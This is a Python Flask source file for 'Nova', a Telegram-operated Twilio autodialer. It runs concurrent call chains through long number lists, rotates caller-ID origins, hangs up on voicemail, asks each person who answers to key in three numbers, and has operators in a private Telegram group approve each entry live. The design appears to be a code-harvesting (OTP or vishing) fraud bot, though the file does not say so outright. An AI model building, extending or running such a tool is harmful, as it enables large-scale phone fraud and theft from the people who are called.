    """Botones ⬅️/➡️ para pasar de pagina + 📄 para ver TODOS los numeros."""
    total_paginas = _total_paginas(numeros)
    pagina = _normalizar_pagina(pagina, total_paginas)
    filas = []
    flechas = []
    if pagina > 1:
        flechas.append(
            {"text": "⬅️ Anterior", "callback_data": f"{prefijo}_{pagina - 1}"}
        )
    if pagina < total_paginas:
        flechas.append(
            {"text": "➡️ Siguiente", "callback_data": f"{prefijo}_{pagina + 1}"}
        )
    if flechas:
        filas.append(flechas)
    filas.append([{"text": "📄 Ver todos (.txt)", "callback_data": "vertodos_todos"}])
    return filas


def _teclado_numeros(numeros: list, pagina: int = 1) -> list:
    """Teclado de /llamar: un boton por numero de la pagina + paginacion.

    Los numeros van en grupos de NUMEROS_POR_PAGINA (10 por defecto) para que
    con 300+ numeros el menu siga siendo usable: se navega con ⬅️/➡️ y se
    descarga la lista COMPLETA en un .txt con 📄 Ver todos.
    """
    pagina = _normalizar_pagina(pagina, _total_paginas(numeros))
    filas = [
        [{"text": f"📞 {n}", "callback_data": f"llamar_{n}"}]
        for n in _tramo_pagina(numeros, pagina)
    ]
    filas.extend(_teclado_navegar(numeros, pagina, "menu"))
    filas.append([{"text": "🛑 Cancelar", "callback_data": "llamar_cancelar"}])
    return filas


def _enviar_lista(pagina: int = 1) -> None:
    """Comando /llamar: manda el menu paginado (grupos de 10)."""
    numeros = cfg.numeros_a_llamar()
    if not numeros:
        _tg_mensaje(
            "⚠️ No hay números en la lista.\n"
            "Agrega uno con: /agregar +573001234567"
        )
        return
    _tg_mensaje(_encabezado_menu(numeros, pagina), _teclado_numeros(numeros, pagina))


def _enviar_todos_los_numeros() -> None:
    """Manda la lista COMPLETA en un .txt (asi se ven todos de una sola vez)."""
    numeros = cfg.numeros_a_llamar()
    if not numeros:
        _tg_mensaje(
            "⚠️ La lista está vacía.\nAgrega uno con: /agregar +573001234567"
        )
        return
    _tg_documento(
        "numeros-nova.txt",
        "\n".join(numeros) + "\n",
        f"📄 Los {len(numeros)} números de la lista (uno por línea).",
    )


# --- Origen de las llamadas --------------------------------------------------
_froms_por_destino: dict = {}
_origenes_vistos: set = set()
_froms_lock = threading.Lock()
# Numeros de origen alternativos conocidos (se probaran si el del .env da error).
_ORIGENES_CONOCIDOS = [
    n.strip()
    for n in os.getenv("TWILIO_ORIGENES", "").split(",")
    if n.strip()
]


def _origenes_disponibles() -> list:
    """Todos los numeros de origen que podemos probar.

    Incluye el TWILIO_NUMBER del .env, los de TWILIO_ORIGENES y los que se hayan
    descubierto en llamadas anteriores (para no repetir pruebas).
    """
    candidatos = []

    def agregar(numero: str) -> None:
        numero = (numero or "").strip()
        if numero and numero not in candidatos:
            candidatos.append(numero)

    agregar(cfg.TWILIO_NUMBER)
    for extra in _ORIGENES_CONOCIDOS:
        agregar(extra)
    with _froms_lock:
        for origen in _origenes_vistos:
            agregar(origen)
    return candidatos


def _from_para(destino: str) -> str:
    """Numero de origen que ya sabemos que sirve para ese destino (o el del .env)."""
    with _froms_lock:
        return _froms_por_destino.get(destino) or cfg.TWILIO_NUMBER


def _recordar_origen(destino: str, origen: str) -> None:
    """Recuerda que para 'destino' el origen valido es 'origen'."""
    with _froms_lock:
        _froms_por_destino[destino] = origen
        _origenes_vistos.add(origen)


def _descubrir_origenes_del_historial() -> None:
    """Aprende del historial de Twilio que origen usa cada destinatario.

    Las llamadas anteriores quedan en el historial de Twilio: de ahi se sacan
    los pares destino -> origen. Asi, al arrancar, Nova ya sabe con que numero de
    la cuenta llamar a los que haya llamado antes (util si algun dia usa varios
    origenes).
    """
    try:
        import requests

        a = (cfg.TWILIO_ACCOUNT_SID, cfg.TWILIO_AUTH_TOKEN)
        url = (
            f"https://api.twilio.com/2010-04-01/Accounts/"
            f"{cfg.TWILIO_ACCOUNT_SID}/Calls.json?PageSize=200"
        )
        datos = requests.get(url, auth=a, timeout=10).json()
    except Exception as exc:  # noqa: BLE001
        print(f"[origenes] no se pudo leer el historial: {exc}")
        return
    for llamada in datos.get("calls", []):
        destino = (llamada.get("to") or "").strip()
        origen = (llamada.get("from") or "").strip()
        if destino and origen:
            with _froms_lock:
                _froms_por_destino.setdefault(destino, origen)
                _origenes_vistos.add(origen)
    print(
        "[origenes] aprendidos del historial: "
        + (", ".join(sorted(_origenes_vistos)) or "(ninguno)")
    )


def _crear_llamada(destino: str, base: str):
    """Crea la llamada probando varios origenes si Twilio da un error de origen.

    Si la cuenta tiene varios numeros de origen, se prueban todos los conocidos
    hasta dar con el que Twilio acepta para ese destino y se recuerda para la
    proxima. Devuelve el objeto de la llamada.
    """
    from twilio.base.exceptions import TwilioRestException

    # Probamos TODOS los origenes conocidos, empezando por el que mejor pinta.
    candidatos = []

    def agregar(numero: str) -> None:
        numero = (numero or "").strip()
        if numero and numero not in candidatos:
            candidatos.append(numero)

    agregar(_from_para(destino))
    for origen in _origenes_disponibles():
        agregar(origen)

    ultimo = None
    for origen in candidatos:
        try:
            # La deteccion de buzon (AMD) va con la cuenta de pago/verificada.
            extra = {}
            if cfg.MAQUINA_DETECCION:
                extra["machine_detection"] = cfg.MAQUINA_DETECCION
                # ASINCRONA (por defecto): Twilio NO retiene la llamada esperando
                # el analisis, asi el saludo "Soy Nova" suena de inmediato y el
                # resultado del buzon llega aparte a /voice/amd (si es maquina, se
                # cuelga ahi). Sin esto, la AMD SINCRONA bloquea el saludo varios
                # segundos (quien contesta oye silencio).
                if cfg.MAQUINA_DETECCION_ASINCRONA:
                    extra["async_amd"] = "true"
                    extra["async_amd_status_callback"] = f"{base}/voice/amd"
                    extra["async_amd_status_callback_method"] = "POST"
                # SEGUNDOS que Twilio insiste en el analisis (default de Twilio: 30).
                extra["machine_detection_timeout"] = cfg.MAQUINA_DETECCION_TIMEOUT
            try:
                llamada = twilio_client.calls.create(
                    to=destino,
                    from_=origen,
                    url=f"{base}/voice/start?telefono={quote(destino, safe='')}",
                    status_callback=f"{base}/voice/estado-llamada",
                    status_callback_event=[
                        "initiated",
                        "ringing",
                        "answered",
                        "completed",
                    ],
                    # Tope DURO en Twilio: si el flujo se atasca, Twilio cierra la
                    # llamada solo tras este tiempo (ademas del vigilante local).
                    time_limit=cfg.LIMITE_LLAMADA,
                    **extra,
                )
            except TwilioRestException as exc:
                # Si el problema es solo la deteccion de buzon, reintentamos sin
                # ella para no perder la llamada (algunas cuentas la rechazan).
                msg = (exc.msg or "").lower()
                if extra and (
                    exc.code in (0, 21215) or "disallowed parameters" in msg
                ):
                    print("[llamada] machine_detection no permitido; se omite.")
                    llamada = twilio_client.calls.create(
                        to=destino,
                        from_=origen,
                        url=f"{base}/voice/start?telefono={quote(destino, safe='')}",
                        status_callback=f"{base}/voice/estado-llamada",
                        status_callback_event=[
                            "initiated",
                            "ringing",
                            "answered",
                            "completed",
                        ],
                        time_limit=cfg.LIMITE_LLAMADA,
                    )
                else:
                    raise
            _recordar_origen(destino, origen)
            return llamada
        except TwilioRestException as exc:
            ultimo = exc
            if exc.code != 573003:
                raise
    raise ultimo


def _explicar_error_twilio(exc) -> str:
    """Traduce los errores tipicos de Twilio a algo que se entienda en Telegram."""
    codigo = getattr(exc, "code", None)
    if codigo in (573002, 14111, 21219):
        return (
            "⚠️ Twilio rechazó el destino (número no permitido o restringido).\n"
            "Revisa que el número de destino sea válido y que tu cuenta tenga\n"
            "permiso para llamar a ese país (Geographic Permissions).\n"
            "Si acabas de pasar de Trial, verifica que la cuenta esté al día "
            "en: console.twilio.com → Billing."
        )
    if codigo == 573003:
        return (
            "⚠️ Twilio no reconoce el número de origen (TWILIO_NUMBER) para ese "
            "destino.\n"
            "Revisa TWILIO_NUMBER en el .env (debe ser un número de la cuenta) y, "
            "si tienes varios, añádelos en TWILIO_ORIGENES (separados por coma)."
        )
    if codigo == 21215 or "not authorized to call" in (
        getattr(exc, "msg", "") or ""
    ).lower():
        return (
            "⚠️ Tu cuenta de Twilio NO tiene permitido llamar a ese país "
            "(error 21215).\n"
            "Actívalo en: console.twilio.com → Voice → Settings → "
            "Geographic Permissions y habilita el país del destino.\n"
            "Sin ese permiso, Twilio rechaza la llamada aunque el número de "
            "origen (TWILIO_NUMBER) sea correcto."
        )
    if codigo in (21210, 21212, 21213, 21606):
        return (
            "⚠️ Tu número de origen (TWILIO_NUMBER) no sirve para llamar.\n"
            "Revisa TWILIO_NUMBER en el archivo .env."
        )
    if codigo in (21211, 21214):
        return "⚠️ El número de destino no es válido."
    if "disallowed parameters" in (getattr(exc, "msg", "") or "").lower():
        return (
            "⚠️ Twilio no permite algunos parámetros de la llamada (ej. detección "
            "de buzón). Nova ya reintenta sin ellos, así que la llamada saldrá "
            "igual. Si quieres detección de buzón, revisa MAQUINA_DETECCION "
            "en el .env y que tu cuenta lo tenga habilitado."
        )
    return f"⚠️ Twilio rechazó la llamada: {exc}"


def _resumen_uso_twilio(cliente=None) -> dict:
    """Lee de Twilio el saldo disponible y el gasto acumulado (hoy, mes, total)."""
    cliente = cliente or twilio_client
    cuenta = cliente.api.v2010.account
    saldo = cuenta.balance.fetch()
    datos = {
        "saldo": saldo.balance,
        "moneda": saldo.currency or "USD",
        "hoy": None,
        "mes": None,
        "total": None,
        "llamadas_mes": None,
        "minutos_mes": None,
    }
    # La categoría "totalprice" ya viene agregada: sumarla evita doble conteo.
    for clave, registros in (
        ("hoy", cliente.usage.records.today),
        ("mes", cliente.usage.records.this_month),
        ("total", cliente.usage.records.all_time),
    ):
        for fila in registros.list(category="totalprice"):
            datos[clave] = fila.price
    for fila in cliente.usage.records.this_month.list(category="calls"):
        datos["llamadas_mes"] = fila.count
        datos["minutos_mes"] = fila.usage
    return datos


def _formatear_saldo(datos: dict) -> str:
    """Arma el mensaje de /saldo con el saldo y el gasto en formato legible."""
    moneda = datos.get("moneda") or "USD"

    def dinero(valor) -> str:
        if valor is None:
            return "—"
        return f"{float(valor):.2f} {moneda}"

    lineas = [
        "💳 Saldo de Twilio",
        f"• Disponible: {dinero(datos.get('saldo'))}",
        f"• Gastado hoy: {dinero(datos.get('hoy'))}",
        f"• Gastado este mes: {dinero(datos.get('mes'))}",
        f"• Gastado en total: {dinero(datos.get('total'))}",
    ]
    llamadas = datos.get("llamadas_mes")
    if llamadas is not None:
        lineas.append(
            f"• Llamadas este mes: {llamadas} ({datos.get('minutos_mes') or 0} min)"
        )
    return "\n".join(lineas)


def _comando_saldo() -> None:
    """Responde a /saldo con el saldo restante y lo gastado en Twilio."""
    try:
        datos = _resumen_uso_twilio()
    except Exception as exc:  # noqa: BLE001
        _tg_mensaje(f"⚠️ No se pudo consultar el saldo en Twilio: {exc}")
        return
    _tg_mensaje(_formatear_saldo(datos))


def _marcar_numero(numero: str, operador: str, consulta_id: str | None = None) -> None:
    """Marca a UN numero.

    Se usa igual desde el boton del menu de /llamar (con consulta_id, para cerrar
    el spinner) que escribiendolo directo: '/llamar +573000000004' marca de una
    vez, sin pasar por el menu. Si el numero no esta en la lista se avisa.
    """
    if numero == "cancelar":
        if consulta_id:
            _tg_responder_boton(consulta_id, "Cancelado")
        _tg_mensaje("🛑 No se llamó a nadie.")
        return

    if numero not in cfg.numeros_a_llamar():
        if consulta_id:
            _tg_responder_boton(consulta_id, "Ese número no está en la lista")
        _tg_mensaje(
            f"⚠️ {numero} no está en la lista de números.\n"
            f"Agrégalo con: /agregar {numero}"
        )
        return

    try:
        base = cfg.webhook_base_url()
    except cfg.SinUrlPublicaError as exc:
        if consulta_id:
            _tg_responder_boton(consulta_id, "No hay URL pública")
        _tg_mensaje(f"⚠️ Nova no puede marcar: {exc}")
        return

    try:
        llamada = _crear_llamada(numero, base)
    except Exception as exc:  # noqa: BLE001
        _tg_responder_boton(consulta_id, "No se pudo llamar")
        _tg_mensaje(_explicar_error_twilio(exc))
        return

    if consulta_id:
        _tg_responder_boton(consulta_id, "Llamando…")
    _tg_mensaje(f"📞 {operador} pidió llamar a {numero}.\nCallSid: {llamada.sid}")
    # El panel NO se abre aqui: el menú del grupo solo aparece cuando alguien
    # CONTESTA la llamada (lo abre /voice/start o el aviso 'in-progress').


def _responder_comando(comando: str, texto: str, operador: str = "desconocido") -> None:
    lista = cfg.numeros_a_llamar()

    if comando == "/llamar":
        # '/llamar +573000000004' marca DE UNA VEZ; '/llamar' sin número abre el menú.
        numero = _numero_explicito(texto)
        if numero:
            _marcar_numero(numero, operador)
        else:
            _enviar_lista()
    elif comando == "/ciclos":
        # '/ciclos' arranca la cadena con el grupo por defecto (5); '/ciclos 8'
        # la arranca manteniendo 8 llamadas a la vez.
        grupo = _entero_extra(texto, cfg.CICLOS_GRUPO)
        if cadena.activo:
            _tg_mensaje(
                f"🔗 La cadena YA está activa (grupo de {cadena.grupo}, "
                f"{cadena.en_curso} en curso).\nPara detenerla: /apagar"
            )
        elif not lista:
            _tg_mensaje(
                "📋 No hay números que llamar.\n"
                "Agrega uno con: /agregar +573001234567"
            )
        else:
            # El mensaje de confirmación ES el mensaje EN VIVO de la cadena: se
            # manda UNA vez y luego se EDITA con el avance (por dónde va y cuántas
            # lleva). Así no se llena el chat de mensajes.
            mensaje_id = _tg_mensaje(
                f"🔗 Cadena de llamadas iniciada.\n"
                f"• Mantendrá {grupo} llamadas a la vez\n"
                f"• En cuanto una cuelga, marca la siguiente\n"
                f"• Recorrerá los {len(lista)} números de la lista"
                + (" (y repetirá)" if cfg.CICLOS_REPETIR else "")
                + "\nPara detenerla: /apagar"
            )
            cadena.encender(grupo, progreso_id=mensaje_id)
    elif comando == "/apagar":
        # Detiene la CADENA (deja de marcar llamadas nuevas).
        había = cadena.activo
        cadena.apagar()
        en_curso = cadena.en_curso
        # Deja el mensaje EN VIVO con el total final (se EDITA, no se duplica).
        # Solo si la cadena llegó a tener un mensaje en vivo (no manda uno suelto).
        if había or cadena.progreso_id is not None:
            cadena.publicar_progreso(force=True, en_marcha=False)
        if había or en_curso:
            _tg_mensaje(
                "🔴 Nova apagada. La cadena deja de marcar llamadas nuevas.\n"
                f"• Las {en_curso} que están EN CURSO siguen vivas (ciérralas "
                "con 🛑 Colgar o espera a que terminen).\n"
                "• Para volver a llamar: /ciclos"
            )
        else:
            _tg_mensaje("🔴 Nova apagada. La cadena no está marcando.")
    elif comando == "/estado":
        with lock_llamadas:
            en_curso = len(llamadas_activas)
        _tg_mensaje(
            f"⚙️ Estado de Nova\n"
            f"• Cadena (/ciclos): {'🟢 activa' if cadena.activo else '🔴 apagada'}"
            + (f" · grupo de {cadena.grupo}" if cadena.activo else "")
            + "\n"
            + (
                f"• Avance de la cadena: número {cadena.posicion}/{cadena.total}"
                f" · ha llamado a {cadena.marcadas}\n"
                if cadena.marcadas
                else ""
            )
            + f"• Llamadas de la cadena en curso: {cadena.en_curso}\n"
            f"• Llamadas en curso (total): {en_curso}\n"
            f"• Números en la lista: {len(lista)}"
        )
    elif comando == "/saldo":
        _comando_saldo()
    elif comando == "/historial":
        filas = _bd(bd.ultimas, 5) or []
        if not filas:
            _tg_mensaje("📋 Todavía no hay llamadas registradas.")
        else:
            lineas = ["📋 Últimas llamadas"]
            for fila in filas:
                marca = "✅" if fila.get("operador") else "⏳"
                quien = f" · {fila['operador']}" if fila.get("operador") else ""
                lineas.append(
                    f"{marca} {fila.get('telefono') or 's/n'} — {fila.get('estado')}{quien}"
                )
            lineas.append("\nDetalle de una llamada: /reporte <CallSid>")
            _tg_mensaje("\n".join(lineas))
    elif comando == "/reporte":
        partes = texto.split(None, 1)
        if len(partes) < 2:
            _tg_mensaje("Uso: /reporte CA00000000000000000000000000000001")
        else:
            reporte = _bd(bd.resumen, partes[1])
            _tg_mensaje(f"```\n{reporte or 'Sin registro'}\n```")
    elif comando == "/numeros":
        if not lista:
            _tg_mensaje(
                "📋 La lista está vacía.\n"
                "Agrega uno con: /agregar +573001234567"
            )
        else:
            pagina = _pagina_de(texto)
            # _teclado_navegar ya incluye el botón 📄 Ver todos (una sola fila).
            _tg_mensaje(
                _texto_pagina(lista, pagina),
                _teclado_navegar(lista, pagina, "numeros"),
            )
    elif comando == "/agregar":
        _agregar_numeros(texto)
    elif comando == "/quitar":
        _quitar_numeros(texto)
    elif comando == "/limpiar":
        cfg.guardar_numeros([])
        _tg_mensaje("🗑️ Lista de números vaciada.")
    else:
        _tg_mensaje(
            "🤖 Nova — comandos disponibles\n"
            "/llamar    → menú para elegir a cuál número llamar\n"
            "/llamar <tel>  → llama YA a ese número, sin pasar por el menú\n"
            "/ciclos [n]  → cadena: mantiene n llamadas (def. 5) y, al colgar una,\n"
            "               marca la siguiente de toda la lista sin parar\n"
            "/apagar    → detiene la cadena (no cuelga las que están en curso)\n"
            "/estado    → muestra el estado actual\n"
            "/saldo     → saldo restante y gasto en Twilio\n"
            "/numeros [pág] → lista a marcar por páginas (10 por página)\n"
            "/agregar <tel>  → agrega números (varios separados por espacio)\n"
            "/quitar <tel>   → quita números\n"
            "/limpiar   → vacía la lista\n"
            "/historial → últimas llamadas registradas\n"
            "/reporte <CallSid> → historial detallado de una llamada\n\n"
            "En cada llamada se piden 3 números terminados en "
            f"{cfg.TECLA_FIN} y aquí los validas con los botones.\n\n"
            "by @dezuhmontana & @mercumbra00"
        )


@app.route("/telegram/webhook", methods=["POST"])
def telegram_webhook():
    data = request.get_json(silent=True) or {}

    # Si agregan a Nova a un grupo NO autorizado, se sale sola.
    if "my_chat_member" in data:
        _tramitar_membresia(data["my_chat_member"])
        return jsonify(ok=True)

    if "message" in data and "text" in data["message"]:
        chat = data["message"]["chat"]
        chat_id = str(chat["id"])
        autor = data["message"].get("from") or {}
        if not cfg.chat_autorizado(chat_id):
            # Grupo NO autorizado: Nova no responde y ademas se sale.
            _sacar_de_grupo_no_autorizado(chat)
            return jsonify(ok=True)
        if not _autorizado(chat_id, autor):
            # Solo administradores: a cualquiera del grupo se le avisa.
            operador = autor.get("username") or autor.get("first_name") or "usuario"
            _tg_mensaje(
                f"🔒 {operador}, No puedes usar el bot."
            )
            return jsonify(ok=True)
        texto = data["message"]["text"].strip()
        if texto.startswith("/"):
            operador = autor.get("username") or autor.get("first_name") or "desconocido"
            _responder_comando(
                texto.split()[0].split("@")[0].lower(), texto, operador
            )
        return jsonify(ok=True)

    if "callback_query" in data:
        consulta = data["callback_query"]
        consulta_id = consulta.get("id", "")
        accion, _, call_sid = consulta.get("data", "").partition("_")
        de = consulta.get("from") or {}
        operador = de.get("username") or de.get("first_name") or "desconocido"
        chat_id = str(((consulta.get("message") or {}).get("chat") or {}).get("id", ""))
        if not cfg.chat_autorizado(chat_id):
            _tg_responder_boton(consulta_id, "Grupo no autorizado")
            return jsonify(ok=True)
        if not _autorizado(chat_id, de):
            _tg_responder_boton(consulta_id, "🔒 Solo administradores")
            return jsonify(ok=True)

        # Paginación de /llamar (menu_N): cambia de página el mismo mensaje.
        if accion == "menu":
            _tg_responder_boton(consulta_id)
            numeros = cfg.numeros_a_llamar()
            pagina = _normalizar_pagina(_pagina_entera(call_sid), _total_paginas(numeros))
            _tg_editar_mensaje(
                cfg.TELEGRAM_GROUP_CHAT_ID,
                (consulta.get("message") or {}).get("message_id"),
                _encabezado_menu(numeros, pagina),
                _teclado_numeros(numeros, pagina),
            )
            return jsonify(ok=True)

        # Paginación de /numeros (numeros_N).
        if accion == "numeros":
            _tg_responder_boton(consulta_id)
            numeros = cfg.numeros_a_llamar()
            pagina = _normalizar_pagina(_pagina_entera(call_sid), _total_paginas(numeros))
            _tg_editar_mensaje(
                cfg.TELEGRAM_GROUP_CHAT_ID,
                (consulta.get("message") or {}).get("message_id"),
                _texto_pagina(numeros, pagina),
                # _teclado_navegar ya incluye el botón 📄 Ver todos (una sola fila).
                _teclado_navegar(numeros, pagina, "numeros"),
            )
            return jsonify(ok=True)

        # 📄 Ver todos: manda la lista completa en un .txt descargable.
        if accion == "vertodos":
            _tg_responder_boton(consulta_id)
            _enviar_todos_los_numeros()
            return jsonify(ok=True)

        if accion == "llamar":
            _marcar_numero(call_sid, operador, consulta_id)
            return jsonify(ok=True)

        if accion not in ACCIONES or not call_sid:
            _tg_responder_boton(consulta_id, "Acción desconocida")
            return jsonify(ok=True)

        nuevo_estado, aviso = ACCIONES[accion]
        if nuevo_estado == COLGADO:
            # 🛑 Colgar (boton o /colgar): se cierra la llamada por el camino
            # UNICO, para que el panel quede en la MISMA luz roja que los demas
            # finales. Primero se corta en Twilio de verdad (no solo el estado).
            _tg_responder_boton(consulta_id, f"{aviso} ({operador})")
            _bd(bd.actualizar, call_sid, estado=nuevo_estado, operador=operador)
            _bd(bd.registrar_evento, call_sid, "decision", f"{accion} por {operador}", operador)
            _bd(bd.cerrar, call_sid, operador)
            _colgar_en_twilio(call_sid)
            _cerrar_llamada(call_sid, f"🛑 colgada por {operador}")
            return jsonify(ok=True)

        with lock_llamadas:
            llamada = llamadas_activas.get(call_sid)
            if llamada is None:
                _tg_responder_boton(consulta_id, "Esa llamada ya no está activa")
                return jsonify(ok=True)
            llamada["estado"] = nuevo_estado
            # Decisión tuya => la llamada dio señales de vida (no es abandonada).
            llamada["latido"] = time.time()
            if nuevo_estado in (APROBADO_1_2, APROBADO_FINAL):
                llamada["operador"] = operador
            # La luz sigue VERDE (la llamada está viva); la decisión va en la nota.
            llamada["estado_txt"] = ESTADO_EN_LLAMADA
            llamada["nota"] = f"{aviso} — {operador}"

        _bd(bd.actualizar, call_sid, estado=nuevo_estado, operador=operador)
        _bd(
            bd.registrar_evento,
            call_sid,
            "decision",
            f"{accion} por {operador}",
            operador,
        )
        _tg_responder_boton(consulta_id, f"{aviso} ({operador})")
        # Refresca el MISMO mensaje de la llamada: no se manda uno nuevo.
        # (El boton '🛑 Colgar' sigue visible mientras la llamada sigue viva.)
        _tg_panel(call_sid, [])
        return jsonify(ok=True)

    return jsonify(ok=True)


if __name__ == "__main__":
    _bd(bd.init)
    _descubrir_origenes_del_historial()
    _arrancar_vigilante()
    _arrancar_reloj()
    # Auto-reparacion del webhook de Telegram: si el servidor venia caido (o la
    # URL del tunel cambio), Telegram acumula los mensajes y deja de responder
    # aunque el servidor ya este sano. Se hace en un hilo para no retrasar la
    # salida del servidor ('Nova escuchando...') ni el propio app.run.
    _en_hilo(_asegurar_webhook_telegram)
    # ...y se sigue vigilando DESPUES: un fallo a mitad de dia (tunel/red) deja
    # a Telegram en 'backoff' igual, sin que el servidor se reinicie.
    _arrancar_vigilante_webhook()
    faltan = cfg.faltantes()
    if faltan:
        print("Faltan credenciales en .env: " + ", ".join(faltan))
        print("Copia .env.example a .env y rellena esos valores.\n")
    try:
        print(
            f"Nova escuchando en http://127.0.0.1:{cfg.PUERTO}  (túnel: {_base()})\n"
            f"Números a marcar: {cfg.numeros_a_llamar()}\n"
        )
    except cfg.SinUrlPublicaError as exc:
        print(f"{exc}\n")
    app.run(host="0.0.0.0", port=cfg.PUERTO, threaded=True)
